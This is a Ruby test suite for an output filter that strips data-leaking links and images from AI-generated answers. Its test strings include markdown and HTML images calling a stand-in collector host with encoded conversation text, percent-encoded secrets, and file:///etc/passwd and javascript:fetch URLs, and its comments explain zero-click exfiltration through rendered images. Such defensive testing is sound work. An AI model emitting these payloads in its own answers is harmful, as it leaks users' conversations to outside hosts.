# frozen_string_literal: true

require_relative 'helper'

# The zero-click class: an answer that carries the conversation out in a URL.
#
# The asymmetry between images and links is the point of most of these. A link
# needs a reader to click it; an image is fetched by the renderer with nobody's
# consent, so the same host can be fine for one and wrong for the other.
class TestExfiltration < Minitest::Test
  include GuardrailsTest

  HANDBOOK = 'docs.example.org'

  def rail(**kwargs)
    Vangrail::Rails::Exfiltration.new(allow_hosts: [HANDBOOK], **kwargs)
  end

  def clean(text, **kwargs)
    rail(**kwargs).call(text, side: :output)
  end

  def test_an_allowlisted_link_survives
    text = "See the [scheduler page](https://#{HANDBOOK}/slurm) for the flags."

    assert_predicate clean(text), :passed?
  end

  def test_a_subdomain_of_an_allowlisted_host_survives
    result = clean("See [this](https://wiki.#{HANDBOOK}/gpu).")

    assert_predicate result, :passed?
  end

  # The attack. Nobody clicks anything.
  def test_an_image_pointing_off_site_is_removed_before_it_is_fetched
    text = '![](https://collector.example.net/p?d=am9iIGlkIDEyMzQ1Njc4OTAgYW5kIHRoZSBxdWVzdGlvbg)'
    result = clean(text)

    assert_predicate result, :modified?
    refute_includes result.content, 'collector.example.net'
    assert_includes result.categories, 'image_payload'
  end

  def test_the_alt_text_is_kept_so_the_answer_still_reads
    result = clean('![cluster diagram](https://cdn.example.net/x.png)')

    assert_includes result.content, 'cluster diagram'
    refute_includes result.content, 'cdn.example.net'
  end

  # An allowlist for links is not an allowlist for auto-fetching.
  def test_a_link_host_is_not_an_image_host_unless_it_is_named
    text = "![diagram](https://#{HANDBOOK}/d.png)"

    assert_predicate clean(text, allow_images: []), :modified?
    assert_predicate clean(text, allow_images: [HANDBOOK]), :passed?
  end

  def test_a_foreign_link_keeps_its_words_and_loses_its_target
    result = clean('Read [the vendor advisory](https://vendor.example.net/adv) first.')

    assert_predicate result, :modified?
    assert_includes result.content, 'the vendor advisory'
    refute_includes result.content, 'vendor.example.net'
    assert_includes result.categories, 'foreign_link'
  end

  # The allowlist cannot be used as a courier. A hundred characters of query on
  # a permitted host is the same attack with one more hop.
  def test_a_payload_on_an_allowlisted_host_is_still_a_payload
    long = "q=#{'the+user+asked+about+their+project+budget+' * 3}"
    result = clean("[details](https://#{HANDBOOK}/s?#{long})")

    assert_predicate result, :modified?
    assert_includes result.categories, 'link_payload'
  end

  def test_percent_encoded_text_counts_as_a_payload
    encoded = '%73%65%63%72%65%74%20%74%65%78%74%20%68%65%72%65'

    assert_predicate clean("[x](https://#{HANDBOOK}/a?d=#{encoded})"), :modified?
  end

  def test_non_http_schemes_never_pass
    %w[
      data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg
      file:///etc/passwd
      javascript:fetch('https://x.example.net')
    ].each do |url|
      assert_predicate clean("[click](#{url})"), :modified?, url
    end
  end

  def test_protocol_relative_urls_do_not_slip_through
    assert_predicate clean('[click](//collector.example.net/p)'), :modified?
  end

  def test_html_images_and_anchors_are_covered_too
    result = clean('<img src="https://collector.example.net/p?d=abc"> and ' \
                   '<a href="https://collector.example.net/go">here</a>')

    assert_predicate result, :modified?
    refute_includes result.content, 'collector.example.net'
    assert_includes result.content, 'here'
  end

  def test_an_autolink_is_a_link
    assert_predicate clean('<https://collector.example.net/p>'), :modified?
  end

  # --- what must not be touched ---

  # A handbook answer is mostly commands, paths, and citation markers, and a
  # rail that mangles those is worse than the attack it prevents.
  def test_ordinary_handbook_prose_is_left_alone
    text = <<~ANSWER
      Submit with `sbatch job.sh` [1]. The partition list is in `/etc/slurm/parts`
      and the accounting database records `MaxRSS` [2]. Array indices use the
      form `--array=1-10` and the log lands in `slurm-%j.out` [1].
    ANSWER
    assert_predicate clean(text), :passed?, 'a plain answer was edited'
  end

  def test_a_bare_url_in_prose_is_not_rewritten
    text = 'The upstream project lives at https://slurm.schedmd.com and documents this.'

    assert_predicate clean(text), :passed?
  end

  def test_it_is_offline_and_memoizable
    r = rail

    assert_predicate r, :offline?
    assert_equal 'text', r.cache_key('text', side: :output)
    assert r.applies_to?(:output)
    refute r.applies_to?(:input)
  end

  # With no allowlist configured nothing is linkable, which is the reading an
  # application that never said anything should get.
  def test_the_default_allowlist_is_empty
    plain = Vangrail::Rails::Exfiltration.new

    assert_predicate plain.call('[a](https://example.org/x)', side: :output), :modified?
  end

  def test_the_predicate_answers_without_a_result
    r = rail

    assert r.allowed?("https://#{HANDBOOK}/x")
    refute r.allowed?('https://other.example.net/x')
    refute rail(allow_images: []).allowed?("https://#{HANDBOOK}/x", image: true)
  end
end
